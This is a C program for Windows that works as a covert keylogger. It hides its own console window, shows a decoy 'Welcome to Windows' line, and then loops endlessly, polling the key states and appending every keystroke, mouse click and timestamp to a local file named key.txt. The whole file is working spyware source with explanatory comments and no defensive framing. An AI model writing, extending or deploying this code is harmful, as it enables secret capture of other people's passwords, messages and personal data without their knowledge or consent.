#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<assert.h>
#include<time.h>

int main() 
{
    HWND hwnd=GetConsoleWindow();  //GetConsoleWindow function retrieves the window handle used by the console associated with the calling process
    //ShowWindow(hwnd,SW_MINIMIZE); // to  minimise the window
    ShowWindow(hwnd,SW_HIDE); // to hide the window
    
    int key,isPressed,last_key_state[0xFF];
    char showKey;
    int isCAPSLOCK,isNUMLOCK,isL_SHIFT,isR_SHIFT;
    char NUMCHAR[]=")!@#$%^&*(";   //to store characters which appear on using shift key with numbers keys
    char chars_vn[]=";=,-./`";     //to store characters which are present on the right side of alphabets
    char chars_vs[]=":+<_>?~";     //to store characters which appear on using shift key with the keys present on right side of characters
    char chars_va[]="[\\]\';";
    char chars_vb[]="{|}\"";       //characters appearing on usage of shift key with charcters of chars_va[]
    
    FILE *fp;                        //creating pointer to my desired file
    char KEY_LOG_FILE[]="key.txt";   //to store .txt file name
    
    for(key=0;key<0xFF;key++)
    last_key_state[key] =0;
    
    time_t t = time(NULL);  //returns the time since the Epoch (00:00:00 UTC, January 1, 1970), measured in seconds.
    struct tm *tm = localtime(&t);   //returns time present at taskbar in the computer
    char s[64];
    size_t ret = strftime(s, sizeof(s), "%c", tm);   //formats time according to the format specifier
    assert(ret);
    fp=fopen(KEY_LOG_FILE,"a");
    fputs("\n",fp);
    fputs(s,fp);       //storing s in my .txt file
    fputs("\n",fp);
    fclose(fp);
    
    printf("Welcome to Windows");
    
    while(1)
    {
        Sleep(10);
        isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;    //if capslock is enabled, 1 is stored, else 0
        isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;     //if numlock is enabled, 1 is stored, else 0
        isL_SHIFT=(GetAsyncKeyState(0xA0)&0xFF00)>0?1:0;   //if left shift is enabled, 1 is stored, else 0
        isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;        //if right shift is enabled, 1 is stored, else 0
     
        for(key=0;key<0xFF;key++)          //runs till 0xFF because its ascii value of any English keyboard character will not run more than 0xFF
        {
            isPressed = GetKeyState(key)&0xFF00>0?1:0;   //GetKeyState(key) retrieves the state of a specified key
            int isPre = GetAsyncKeyState(key);
            showKey=(char)key;   //converts to its ASCII value
            
            if(isPressed==1 && last_key_state[key]==0 || isPre==-32767)
            {
                /*VK is Virtual Key codes used by windows. For example, VK_BACK is code for Backspace of the keyboard. Using switch case, if a key is matched,
                  the key is stored into the file using fputs()*/
                switch(key)     
                {
                    case VK_LBUTTON:
                        //printf("[LBUTTON]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[LBUTTON]",fp);
                        fclose(fp);
                    break;
                    case VK_BACK:
                        //printf("[BACKSPACE]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[BACKSPACE]",fp);
                        fclose(fp);
                    break;
                    case VK_CONTROL:
                        //printf("^");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("^",fp);
                        fclose(fp);
                        break;
                    case VK_RBUTTON:
                        //printf("[RBUTTON]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[RBUTTON]",fp);
                        fclose(fp);
                        break;
                    case VK_SHIFT:
                        //printf("[SHIFT]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[SHIFT]",fp);
                        fclose(fp);
                        break;
                    case VK_MENU:
                        // printf("[ALT]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[ALT]",fp);
                        fclose(fp);
                        break;
                    case VK_ESCAPE:
                        //printf("[ESCAPE]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[ESCAPE]",fp);
                        fclose(fp);
                        break;
                    case VK_LEFT:
                        //printf("[LEFT ARROW]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[LEFT ARROW]",fp);
                        fclose(fp);
                        break;
                    case VK_RIGHT:
                        // printf("[RIGHT ARROW]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[RIGHT ARROW]",fp);
                        fclose(fp);
                        break;    
                    case VK_DOWN:
                        //printf("[DOWN ARROW]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[DOWN ARROW]",fp);
                        fclose(fp);
                        break;
                    case VK_UP:
                        //printf("[UP ARROW]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[UP ARROW]",fp);
                        fclose(fp);
                        break;
                    case VK_DELETE:
                        //printf("[DELETE]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[DELETE]",fp);
                        fclose(fp);
                        break;
                    case VK_SNAPSHOT:
                        //printf("[PRINT SCREEN]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[PRIONT SCREEN]",fp);
                        fclose(fp);
                        break;
                    case VK_LWIN:
                        //printf("[WINDOWS]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[WINDOWS]",fp);
                        fclose(fp);
                        break;
                    case VK_NUMLOCK:
                        //printf("[NUM LOCK]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[NUM LOCK]",fp);
                        fclose(fp);
                        break;
                    default:
                    break;
                }
                
                
        
                if(key>=0x41 && key<=0x5A)    //to store alphabets
                {
                    if(isCAPSLOCK==0)
                    {
                        if(isL_SHIFT==0 || isR_SHIFT==0)
                        showKey=(char)(key+0x20);
                        else 
                        if(isL_SHIFT==1 || isR_SHIFT==1)
                        showKey=(char)(key);
                    }
                }

                else 
                if(key>=0x30 && key<=0x39)        //to store characters appearing above numbers
                {
                    if(isL_SHIFT==1 || isR_SHIFT==1)
                    showKey=NUMCHAR[key-0x30];

                
                }
                else 
                if(key>=0x60 && key<=0x69 && isNUMLOCK==1)     //to store characters from right side numpad
                showKey=(char)(key-0x30);
                
                
                else 
                if(key>=0xBA && key<=0xC0)       //printable characters
                {
                    if(isL_SHIFT==1 || isR_SHIFT==1)
                    showKey=chars_vs[key-0xBA];
                    else
                    showKey=chars_vn[key-0xBA];
                }

                else 
                if(key>=0xDB && key<=0xDF)
                {
                    if(isL_SHIFT==1 || isR_SHIFT==1)
                    showKey=chars_vb[key-0xDB];
                    else
                    showKey=chars_va[key-0xDB];
                }
                
               
                else 
                if(key==0x0D)
                showKey=(char)0x0A; //enter key corresponds to new line in .txt file

                else 
                if(key!=0x20 && key!=0x09)
                showKey=(char)0x00;
                
                if(showKey!=(char)0x00)
                {
                    //printf("%c",showKey);
                    fp=fopen(KEY_LOG_FILE,"a");
                    putc(showKey,fp);
                    fclose(fp);
                }
                
            }
            
            last_key_state[key] = isPressed; //stores state of last pressed key
        }
        
        
    }
}
